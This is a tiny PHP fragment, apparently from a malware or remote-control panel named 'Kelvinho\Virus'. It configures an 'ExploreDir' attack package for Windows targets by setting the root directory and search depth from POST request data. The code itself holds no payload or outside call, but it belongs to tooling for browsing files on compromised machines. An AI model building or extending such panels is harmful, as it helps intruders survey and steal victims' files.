<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\ExploreDir\ExploreDir $this */

$this->setRootDir($this->requestData->postCheck("dir"))->setMaxDepth($this->requestData->postCheck("depth"));
